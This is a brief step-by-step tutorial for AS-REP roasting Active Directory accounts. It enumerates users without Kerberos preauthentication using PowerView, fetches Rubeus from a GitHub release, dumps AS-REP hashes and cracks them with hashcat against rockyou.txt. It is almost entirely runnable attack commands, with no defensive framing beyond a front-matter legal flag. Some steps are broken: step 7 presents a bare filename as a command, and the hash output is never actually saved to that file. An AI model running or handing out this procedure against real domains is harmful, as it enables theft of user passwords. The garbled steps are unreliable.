---
legal-banner: true
---

### **Using PowerView to Enumerate Accounts**

1. Import the PowerView module:  
   ```powershell
   Import-Module .\PowerView.ps1
   ```

2. Find users with the "Do not require Kerberos preauthentication" flag:  
   ```powershell
   Get-DomainUser -PreAuthNotRequired
   ```

3. Request AS-REP for targeted users.Once you have identified vulnerable accounts, request the AS-REP.  

4. Download Rubeus from the GitHub releases page:  
   ```powershell
   Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v1.5.0/Rubeus.zip" -OutFile "Rubeus.zip"
   ```

5. Unzip the downloaded file to a directory of your choice:  
   ```powershell
   Expand-Archive -Path "Rubeus.zip" -DestinationPath ".\Rubeus"
   ```

6. Request AS-REP hashes with Rubeus:  
   ```powershell
   .\Rubeus.exe asreproast
   ```

7. Save the AS-REP hashes to a file:  
   ```powershell
   asrep_hashes.txt
   ```

8. Crack the AS-REP hashes using Hashcat with a wordlist (e.g., `rockyou.txt`):  
   ```bash
   hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
   ```
